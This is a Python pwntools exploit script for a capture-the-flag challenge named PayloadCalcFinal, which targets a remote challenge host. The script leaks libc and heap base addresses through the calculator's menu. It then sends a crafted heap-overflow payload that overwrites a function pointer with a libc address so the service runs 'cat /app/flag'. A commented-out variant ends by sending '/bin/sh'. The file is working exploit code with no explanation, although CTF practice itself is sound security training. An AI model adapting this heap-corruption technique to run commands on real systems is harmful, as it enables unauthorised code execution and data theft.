from pwn import *

#p = process("PayloadCalcFinal")
p = remote('f64f7f49400e47fe8a4098ee51e43f96.payloadcalc.challenges.ctrl-space.gg', 10009, ssl=True)

print(p.recvline())
print(p.recvline())
print(p.recvline())
p.sendline(raw_input())

p.recvuntil(b'Enter your choice (1-7): ')
p.sendline(b'1')
p.sendline(b'1000')
p.sendline(b'a')
p.sendline(b'2025')
p.sendline(b'1')
p.sendline(b'1')

p.recvuntil(b'Press Enter to continue...')
p.send(b'\n')

p.recvuntil(b'Enter your choice (1-7): ')
p.sendline(b'3')
p.sendline(b'1000')
p.sendline(b'2')
p.sendline(b'1.0')
p.sendline(b'0.0')
p.sendline(b'end')
p.sendline(b'end')
p.sendline(b'end')

p.recvuntil(b'Press Enter to continue...')
p.send(b'\n')

p.recvuntil(b'Enter your choice (1-7): ')
p.sendline(b'1')
p.sendline(b'1000')
p.sendline(b'a')
p.sendline(b'2025')
p.sendline(b'1')
p.sendline(b'1')

p.recvuntil(b'Press Enter to continue...')
p.send(b'\n')

p.recvuntil(b'Enter your choice (1-7): ')
p.sendline(b'2')
p.recvuntil(b'a')
p.recvuntil(b'61')
lic = p.recvn(9)
lic = b'a' + bytes.fromhex(lic.replace(b' ', b'').decode())
libc_base = u32(lic)  -0x61 - 0x1b3700
print(f'libc_base = {hex(libc_base)}')

p.recvuntil(b'Press Enter to continue...')
p.send(b'\n')

p.recvuntil(b'Enter your choice (1-7): ')
p.sendline(b'3')
p.sendline(b'8')
p.sendline(b'1')
p.sendline(b'0.0')
p.sendline(b'end')
p.sendline(b'end')

p.recvuntil(b'Press Enter to continue...')
p.send(b'\n')

p.recvuntil(b'Enter your choice (1-7): ')
p.sendline(b'1')
p.sendline(b'10')
p.sendline(b'a')
p.sendline(b'2025')
p.sendline(b'1')
p.sendline(b'1')

p.recvuntil(b'Press Enter to continue...')
p.send(b'\n')

p.recvuntil(b'Enter your choice (1-7): ')
p.sendline(b'2')
p.recvuntil(b'a')
p.recvuntil(b'61')
lic = p.recvn(9)
lic = b'a' + bytes.fromhex(lic.replace(b' ', b'').decode())
heap_base = u32(lic) - 0x61 - 0x700
print(f'heap_base = {hex(heap_base)}')

p.recvuntil(b'Press Enter to continue...')
p.send(b'\n')

p.recvuntil(b'Enter your choice (1-7): ')
p.sendline(b'3')
p.sendline(b'1000')
p.sendline(b'3')
p.sendline(b'0.032')
p.sendline(b'0.024')
p.sendline(b'0.032')
p.sendline(b'end')
p.sendline(b'end')
p.sendline(b'end')
p.sendline(b'end')

p.recvuntil(b'Press Enter to continue...')
p.send(b'\n')


p.recvuntil(b'Enter your choice (1-7): ')
p.sendline(b'3')
p.sendline(b'1000')
p.sendline(b'8')


p.sendline(b'0.100')
p.sendline(b'0.024')
p.sendline(b'0.100')
p.sendline(b'0.100')
p.sendline(b'0.100')
p.sendline(b'0.100')
p.sendline(b'0.100')
p.sendline(b'0.100')

cmd = b'cat /app/flag;'
p.sendline( (b'\xFF' + cmd + b'a'*(0x20-len(cmd)) +p32(heap_base+0x840)+p32(heap_base+0x840)+p32(0x804c014)*6).hex().encode() )
p.sendline(b'end')
p.sendline( p32(libc_base+0x3adb0).hex().encode() )
p.sendline(b'end')
p.sendline(b'end')
p.sendline(b'end')
p.sendline(b'end')
p.sendline(b'end')
p.sendline(b'end')

p.interactive()

'''
p.recvuntil(b'CMD?')
p.sendline(b'U')
p.sendline(b'1000')
p.sendline(b'3')
p.sendline(b'0.032')
p.sendline(b'0.024')
p.sendline(b'0.032')
p.sendline(b'\xff')
p.sendline(b'\xff')
p.sendline(b'\xff')
//

p.recvuntil(b'CMD?')
p.sendline(b'U')
p.sendline(b'1000')
p.sendline(b'8')

p.sendline(b'0.100')
p.sendline(b'0.024')
p.sendline(b'0.100')
p.sendline(b'0.100')
p.sendline(b'0.100')
p.sendline(b'0.100')
p.sendline(b'0.100')
p.sendline(b'0.100')

raw_input()
p.send(b'\xFF' + b'a'*0x20+p32(heap_base+0x840)+p32(heap_base+0x840)+p32(0x804c014)*6)
p.send(b'\xFF')
p.send(p32(libc_base+0x3adb0)+b'\xFF')
p.send(b'\xFF')
p.send(b'\xFF')
p.send(b'\xFF')
p.send(b'\xFF')
p.send(b'\xFF')

p.sendline(b"/bin/sh")
'''
